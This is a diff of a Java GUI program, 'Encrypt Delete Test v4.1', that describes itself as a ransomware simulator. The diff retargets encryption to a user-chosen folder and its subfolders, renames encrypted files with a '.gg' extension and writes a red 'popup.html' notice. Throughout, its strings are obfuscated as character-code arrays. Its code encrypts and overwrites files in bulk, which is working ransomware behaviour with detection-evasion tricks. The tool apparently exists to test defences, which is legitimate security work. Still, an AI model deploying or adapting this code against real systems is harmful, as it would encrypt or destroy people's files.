@@ -36,7 +36,7 @@ import java.net.URI;
 import java.awt.Desktop;
 
 
-public class EncryptDelTestv4 extends JPanel implements ActionListener {
+public class EncryptDelTestv4_1 extends JPanel implements ActionListener {
   private static Cipher encrypt;
   private static Cipher decrypt;
   private static JTextArea textarea = new JTextArea(40, 60);
@@ -52,8 +52,8 @@ public class EncryptDelTestv4 extends JPanel implements ActionListener {
   public static String strEncrypt = Character.toString((char) 69) + Character.toString((char) 110) + Character.toString((char) 99)  + Character.toString((char) 114)  + Character.toString((char) 121)  + Character.toString((char) 112) + Character.toString((char) 116);
   public static String strDecrypt = Character.toString((char) 68) + Character.toString((char) 101) + Character.toString((char) 99)  + Character.toString((char) 114)  + Character.toString((char) 121)  + Character.toString((char) 112) + Character.toString((char) 116);
   
-  public EncryptDelTestv4(){
-    JFrame frame = new JFrame("[Encrypt Delete Test v4]");
+  public EncryptDelTestv4_1(){
+    JFrame frame = new JFrame("[Encrypt Delete Test v4.1]");
     textarea.setFocusable(false);
     textarea.setWrapStyleWord(false);
     textarea.setLineWrap(false);
@@ -77,8 +77,8 @@ public class EncryptDelTestv4 extends JPanel implements ActionListener {
   } 
   
   public static void main(String[] args) throws IOException, ParseException {
-    new EncryptDelTestv4();
-    int CharNum[] = {91,69,110,99,114,121,112,116,32,68,101,108,101,116,101,32,84,101,115,116,32,118,52,32,40,74,97,118,97,41,93};
+    new EncryptDelTestv4_1();
+    int CharNum[] = {91,69,110,99,114,121,112,116,32,68,101,108,101,116,101,32,84,101,115,116,32,118,52,46,49,32,40,74,97,118,97,41,93};
     textarea.append(NumtoString(CharNum)+"\n");
     CharNum = new int[]{83,105,109,117,108,97,116,101,32,114,97,110,115,111,109,119,97,114,101,32,101,110,99,114,121,112,116,105,111,110,32,111,112,101,114,97,116,105,111,110};
     textarea.append(NumtoString(CharNum)+"\n");
@@ -88,7 +88,7 @@ public class EncryptDelTestv4 extends JPanel implements ActionListener {
     textarea.append(NumtoString(CharNum)+"\n");
     CharNum = new int[]{104,116,116,112,115,58,47,47,103,105,116,104,117,98,46,99,111,109,47,101,100,100,105,101,99,104,117,47,69,110,99,114,121,112,116,45,68,101,108,101,116,101,45,84,101,115,116};
     textarea.append(NumtoString(CharNum)+"\n");
-    CharNum = new int[]{86,101,114,115,105,111,110,32,118,52,46,48,46,49,32,40,55,47,79,99,116,47,50,48,50,49,41};
+    CharNum = new int[]{86,101,114,115,105,111,110,32,118,52,46,49,32,40,49,49,47,83,101,112,47,50,48,50,50,41};
     textarea.append(NumtoString(CharNum)+"\n");
     textarea.append("\n");
     CharNum = new int[]{84,104,105,115,32,116,111,111,108,32,101,110,99,114,121,112,116,115,32,45,32,111,118,101,114,119,114,105,116,101,115,32,45,32,114,101,110,97,109,101,115,32,116,104,101,32,102,105,108,101,32,117,110,100,101,114,32,115,101,108,101,99,116,101,100,32,102,111,108,100,101,114,32,97,110,100,32,105,116,39,115,32,115,117,98,102,111,108,100,101,114,40,115,41,41};
@@ -106,17 +106,17 @@ public class EncryptDelTestv4 extends JPanel implements ActionListener {
 
   public static void goProcess() {
     File file;
-    final JFileChooser jfc = new JFileChooser();
+	final JFileChooser jfc = new JFileChooser();
     jfc.setCurrentDirectory(new java.io.File("."));
     jfc.setDialogTitle("Choose a folder or network drive: ");
     jfc.setFileSelectionMode(JFileChooser.DIRECTORIES_ONLY);   
     int returnValue = jfc.showOpenDialog(null);
     if (returnValue == JFileChooser.APPROVE_OPTION){
       file = jfc.getSelectedFile();
+	  textarea.append( "Target:" + file + "\n");
       textarea.append("\n");
-      File currentDir = new File("."); 
+      File currentDir = new File(jfc.getSelectedFile().getPath()); 
       traverseDirectory(currentDir);
-
       if (option.equals(strEncrypt)) {
         try {
           BufferedWriter out = new BufferedWriter(new FileWriter("popup.html"));
@@ -128,7 +128,7 @@ public class EncryptDelTestv4 extends JPanel implements ActionListener {
           out.write(NumtoString(CharNum)+"\n");
           CharNum = new int[]{60,98,111,100,121,32,98,103,99,111,108,111,114,61,114,101,100,62};
           out.write(NumtoString(CharNum)+"\n");
-          CharNum = new int[]{60,102,111,110,116,32,115,105,122,101,61,43,49,48,32,99,111,108,111,114,61,119,104,105,116,101,62,60,98,62,91,69,110,99,114,121,112,116,68,101,108,84,101,115,116,118,52,32,40,74,97,118,97,41,93,60,47,98,62,60,47,102,111,110,116,62,60,98,114,62,60,98,114,62,60,98,114,62,60,98,114,62};
+          CharNum = new int[]{60,102,111,110,116,32,115,105,122,101,61,43,49,48,32,99,111,108,111,114,61,119,104,105,116,101,62,60,98,62,91,69,110,99,114,121,112,116,68,101,108,84,101,115,116,118,52,46,49,32,40,74,97,118,97,41,93,60,47,98,62,60,47,102,111,110,116,62,60,98,114,62,60,98,114,62,60,98,114,62,60,98,114,62};
           out.write(NumtoString(CharNum)+"\n");
           CharNum = new int[]{60,102,111,110,116,32,115,105,122,101,61,43,49,48,32,99,111,108,111,114,61,119,104,105,116,101,62,84,104,97,110,107,115,32,102,111,114,32,121,111,117,114,32,116,101,115,116,33,60,47,102,111,110,116,62,60,98,114,62,60,98,114,62};
           out.write(NumtoString(CharNum)+"\n");
@@ -180,14 +180,14 @@ public class EncryptDelTestv4 extends JPanel implements ActionListener {
         f=new JFrame(); 
         if (encryptedcount > 0){
           int CharNum[] = {79,112,101,114,97,116,105,111,110,32,99,111,109,112,108,101,116,101,100,33};
-          JOptionPane.showMessageDialog(f,NumtoString(CharNum),"[Encrypt Delete Test v4]",JOptionPane.ERROR_MESSAGE);
+          JOptionPane.showMessageDialog(f,NumtoString(CharNum),"[Encrypt Delete Test v4.1]",JOptionPane.ERROR_MESSAGE);
         }
       } else if (option.equals(strDecrypt)){
         int CharNum[] = {79,112,101,114,97,116,105,111,110,32,99,111,109,112,108,101,116,101,100,33};
         textarea.append(NumtoString(CharNum) + "\n");
         JFrame f; 
         f=new JFrame(); 
-        JOptionPane.showMessageDialog(f,NumtoString(CharNum),"[Encrypt Delete Test v4]",JOptionPane.ERROR_MESSAGE);
+        JOptionPane.showMessageDialog(f,NumtoString(CharNum),"[Encrypt Delete Test v4.1]",JOptionPane.ERROR_MESSAGE);
       }
     }
   }
@@ -204,7 +204,7 @@ public class EncryptDelTestv4 extends JPanel implements ActionListener {
               cryptOperation(file.getCanonicalPath());
             }
           }else{
-            if (file.getCanonicalPath().toLowerCase().endsWith(".crypted")){
+            if (file.getCanonicalPath().toLowerCase().endsWith(".gg")){
               cryptOperation(file.getCanonicalPath());
             }
           }
@@ -226,8 +226,8 @@ public class EncryptDelTestv4 extends JPanel implements ActionListener {
   public static void cryptOperation(String filename) {
     try {
       if (option.equals(strEncrypt)) {
-        int CharNum[] = {99,114,121,112,116};
-        String outputfile = filename + "." + NumtoString(CharNum) + "ed";
+        int CharNum[] = {103,103};
+        String outputfile = filename + "." + NumtoString(CharNum);
         textarea.append("Encrypt and overwrite to " + filename + "\n");
 
         Path path = Paths.get(filename);
@@ -252,7 +252,7 @@ public class EncryptDelTestv4 extends JPanel implements ActionListener {
         textarea.append("\n");
     
       } else if (option.equals(strDecrypt)) {
-        String outputfile = filename.replaceAll(".crypted$","");
+        String outputfile = filename.replaceAll(".gg$","");
         textarea.append("Decrypt to " + outputfile + "\n");
 
         Path path = Paths.get(filename);
@@ -331,7 +331,7 @@ public class EncryptDelTestv4 extends JPanel implements ActionListener {
       option = cb.getSelectedItem().toString();
       goProcess();
     } else {
-      JOptionPane.showMessageDialog(this, "Please select option","[Encrypt Delete Test v4]", JOptionPane.ERROR_MESSAGE);
+      JOptionPane.showMessageDialog(this, "Please select option","[Encrypt Delete Test v4.1]", JOptionPane.ERROR_MESSAGE);
     }
   }
  
